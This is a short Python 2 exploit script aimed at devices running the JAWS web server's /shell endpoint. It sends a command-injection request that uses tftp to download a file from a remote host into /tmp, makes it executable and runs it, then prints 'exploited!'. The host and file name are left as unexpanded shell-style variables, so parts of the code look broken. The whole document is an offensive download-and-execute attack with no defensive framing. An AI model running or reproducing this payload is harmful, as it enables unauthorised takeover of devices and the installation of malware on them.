#!/user/bin/env python

import requests,sys,os

def httpRequest(URL,HEADER,BODY,TIMEOUT):
    if not BODY:
        try:
            res = requests.get(URL, headers=HEADER, verify=False, timeout=TIMEOUT)
        except Exception as e:
            return 0,'TIMEOUT'
        else:
            if res.status_code :
                return res.status_code,res.content
            else:
                return 0,'PAGE NOT FOUND'
    else:
        try:
            res = requests.post(URL, data=BODY, headers=HEADER, verify=False, timeout=TIMEOUT)
        except Exception as e:
            return 0,'TIMEOUT'
        else:
            if res.status_code :
                return res.status_code,res.content
            else:
                return 0,'PAGE NOT FOUND'

def COMMANDEXECUTE(URL):
    jawsCmd = URL+'/shell?/usr/bin/tftp+-l+/tmp/$bt+-r+$btAddr+-g+$bt;cd+/tmp;chmod+777+$bt;./$bt'
    status,data = httpRequest(jawsCmd,'',0,10)
    if status!=200:
        return None
    print '  exploited!'

if sys.argv[1]:
    COMMANDEXECUTE(sys.argv[1])
else:
    print 'add parmeter'